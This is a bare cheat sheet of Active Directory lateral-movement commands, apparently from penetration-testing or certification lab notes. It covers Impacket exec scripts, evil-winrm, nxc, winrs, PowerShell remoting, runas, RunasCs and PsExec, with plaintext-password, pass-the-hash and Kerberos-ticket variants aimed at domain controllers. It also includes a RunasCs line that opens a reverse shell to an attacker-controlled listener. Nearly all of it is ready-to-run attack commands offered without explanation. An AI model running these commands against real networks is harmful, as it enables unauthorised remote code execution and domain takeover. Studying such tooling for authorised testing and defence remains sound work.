

```sh
# psexec.py  -> SYSTEM shell, drops a service; noisy, often caught by AV
# wmiexec.py -> semi-interactive, via WMI; quieter, no disk write
# smbexec.py -> via SMB service; similar to psexec, less AV-triggering
# atexec.py  -> runs commands via scheduled tasks (blind output)
# dcomexec.py-> via DCOM; alternative when others are blocked

# --- Normal creds (password / hash) ---
psexec.py   domain/administrator:'Password123'@<DC_IP>
wmiexec.py  domain/administrator:'Password123'@<DC_IP>
smbexec.py  domain/administrator:'Password123'@<DC_IP>
atexec.py   domain/administrator:'Password123'@<DC_IP> whoami
dcomexec.py domain/administrator:'Password123'@<DC_IP>

# pass-the-hash (NTLM must be enabled)
wmiexec.py -hashes :<NThash> domain/administrator@<DC_IP>

# --- Kerberos ---
export KRB5CCNAME=administrator.ccache
psexec.py   -k -no-pass domain/administrator@dc1.domain.local
wmiexec.py  -k -no-pass domain/administrator@dc1.domain.local
smbexec.py  -k -no-pass domain/administrator@dc1.domain.local
atexec.py   -k -no-pass domain/administrator@dc1.domain.local whoami
dcomexec.py -k -no-pass domain/administrator@dc1.domain.local
```




```sh
#evil-winrm

evil-winrm -i <DC_IP> -u administrator -p 'Password123'
# pass-the-hash
evil-winrm -i <DC_IP> -u administrator -H <NThash>

# needs /etc/krb5.conf (realm+KDC), /etc/hosts FQDN, clock synced
export KRB5CCNAME=user.ccache
evil-winrm -i dc1.domain.local -r domain.local

## nxc 
# --- Normal creds ---
nxc smb   <DC_IP> -u user -p 'pass' -x 'whoami'      # cmd exec
nxc smb   <DC_IP> -u user -p 'pass' -X 'whoami'      # powershell exec
nxc winrm <DC_IP> -u user -p 'pass'                  # NTLM only, fails if NTLM disabled

# --- Kerberos ---
nxc smb   dc1.domain.local -u user -k --use-kcache -x 'whoami'
nxc ldap  dc1.domain.local -u user -k --use-kcache

# winrs
# use winrs when connecting to another server with the SAME credentials


winrs -r:dcorp-adminsrv cmd
winrs -r:dcorp-adminsrv.dollarcorp.moneycorp.local hostname

# --- Kerberos ---
#works automatically if you have a valid TGT in the current logon session
winrs -r:dcorp-adminsrv.dollarcorp.moneycorp.local cmd

#PowerShell

$cred = Get-Credential
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -Credential $cred
Invoke-Command -ComputerName dcorp-adminsrv -Credential $cred -ScriptBlock { whoami }

# --- Kerberos (uses current session's ticket) ---
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock { whoami }

# --- runas (native) ---
runas /user:domain\username cmd.exe
runas /savecred /user:domain\username cmd.exe

# --- RunasCs.exe ---
RunasCs.exe <user> <password> cmd.exe
RunasCs.exe <user> <password> -r 10.10.14.5:4444 cmd.exe   :: rev shell back to you

# --- runas with Kerberos (/netonly uses creds for network auth only) ---
runas /netonly /user:domain\username cmd.exe

#PsExec  (Sysinternals, from Windows)

# --- Normal creds ---
PsExec.exe -accepteula \\dc1 -u domain\administrator -p Password123 cmd.exe

# --- Kerberos ---
# run from a session that already holds a valid TGT (no -u/-p needed)
PsExec.exe -accepteula \\dc1.domain.local cmd.exe


# PowerShell
$env:computername
$env:username
whoami /all


# CMD
set username
set computername
whoami /priv
```